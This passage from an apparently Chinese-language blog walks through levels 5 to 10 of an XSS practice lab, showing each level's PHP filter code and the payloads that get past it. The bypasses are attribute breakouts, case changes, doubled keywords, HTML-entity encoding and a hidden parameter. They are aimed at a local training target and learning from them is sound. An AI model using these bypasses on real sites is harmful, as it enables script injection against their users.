class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level6.php?keyword=break it out!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和finish<span class="hljs-symbol">&amp;quot;</span> onfocus=javascript:alert(&#x27;xss&#x27;) <span class="hljs-symbol">&amp;quot;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level5.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;finish&quot;</span> <span class="hljs-attr">o_nfocus</span>=<span class="hljs-string">javascript:alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;) &quot;&quot;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level5.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:42<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>onfocus 里 on 变成 o_n 了。<br>onfocus<br>去docker里看了一眼源码：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level6.php?keyword=break it out!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level5&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level5.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str3</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>依旧没有转义input里的str，那尝试构造：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&#x27;&quot; &gt;&lt;a href=javascript:alert()&gt;HIHI&lt;/a&gt; &lt;&quot;&#x27;</span><br></code></pre></td></tr></table></figure><p>成功</p><h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>可以通过大小写绕过on和er的转义：<br>payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot; &gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hRef</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>HIHI<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> &lt;&quot;&#x27;<br></code></pre></td></tr></table></figure><h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>随便填个payload，然后查看页面源码。  </p><p>发现这次是直接吧关键词过滤了，大小写绕不过了；   </p><p>联想到sql注入类似的场景，双写试一下？  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&#x27;&quot; &gt;&lt;a hrhrefef=javascript:alert()&gt;HIHI&lt;/a&gt; &lt;&quot;&#x27;</span><br></code></pre></td></tr></table></figure><p>成功了，但是点击不了，换一条payload看看呢：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">finish<span class="hljs-string">&quot; oonnfocus=javascript:alert(&#x27;XSS&#x27;) &quot;</span><br></code></pre></td></tr></table></figure><p>成功！  </p><h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>这里多了个添加友情连接，大概就是输入插入里面，源码看一下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;&lt;!--<span class="hljs-variable constant_">STATUS</span> <span class="hljs-variable constant_">OK</span>--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;<br>&lt;script&gt;<br>window.alert = function()  <br>&#123;     <br>confirm(&quot;完成的不错！&quot;);<br> window.location.href=&quot;level9.php?keyword=not bad!&quot;; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level8&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level8&lt;/h1&gt;<br>&lt;center&gt;<br>&lt;form action=level8.php method=GET&gt;<br>&lt;input name=keyword  value=&quot;finish&amp;quot; oonnfocus=javascript:alert(&#x27;xss&#x27;) &amp;quot;&quot;&gt;<br>&lt;input type=submit name=submit value=添加友情链接 /&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;finish&amp;quot oo_nnfocus=javascr_ipt:alert(&#x27;xss&#x27;) &amp;quot&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;<br>&lt;h3 align=center&gt;payload的长度:53&lt;/h3&gt;&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>强制转化为小写并且全部转义。。。    </p><p>忍不住看来网上的wp，说是href会自动编译自己链接里的unioncode，  </p><p>但🈶又问了一下ai：  </p><p><strong>在 HTML 中，href 属性本身不会“编译” Unicode，但浏览器在解析 HTML 和处理 URL 时，会按照标准对 Unicode 字符进行编码和解码。这可能会让你产生“自动编译”的错觉。</strong></p><p>然后🈶又找了一下，发现并不是浏览器解析unioncode的原因，是href会解析html实体的原因  </p><p>能通过将payload编译为html的十进制或十六进制实体来进行绕过：   </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#106;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#58;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#41;</span><br></code></pre></td></tr></table></figure><p>这段在赛博厨子里自动识别为：HTML Entity<br>所以说并不是unioncode</p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>上一关的payload就直接被band了。。。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><br>&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;&lt;!--<span class="hljs-variable constant_">STATUS</span> <span class="hljs-variable constant_">OK</span>--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;<br>&lt;script&gt;<br>window.alert = function()  <br>&#123;     <br>confirm(&quot;完成的不错！&quot;);<br> window.location.href=&quot;level10.php?keyword=well done!&quot;; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level9&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;<br>&lt;center&gt;<br>&lt;form action=level9.php method=GET&gt;<br>&lt;input name=keyword  value=&quot;&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#41;&quot;&gt;<br>&lt;input type=submit name=submit value=添加友情链接 /&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;<br>&lt;h3 align=center&gt;payload的长度:101&lt;/h3&gt;&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>只能去看源码了吗  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level10.php?keyword=well done!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level9&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level9.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-literal">false</span>===<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str7</span>,<span class="hljs-string">&#x27;http://&#x27;</span>))<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>        &#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="hljs-variable">$str7</span>.<span class="hljs-string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str7</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>我们必须让输入包含 http:&#x2F;&#x2F;，否则不会把我们的输入插入到 href 中！  </p><p>这样的话，使用内联注释付 &#x2F;**&#x2F;,在sql中也常用作空格绕过<br>payload:  </p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;&amp;#<span class="hljs-number">41</span>;<span class="hljs-comment">/*http://*/</span><br></code></pre></td></tr></table></figure><h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>这关的注入点在url上<br>看网上wp，有其他传参参数？  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level11.php?keyword=good job!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level10&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>“t_sort”就过滤了尖括号而已，还是上网找了答案：</p><p>playlaod:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">t_sort</span>=<span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span>text<br></code></pre></td></tr></table></figure><p>这样源码就变成了：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level11.php?keyword=good job!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level10<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span 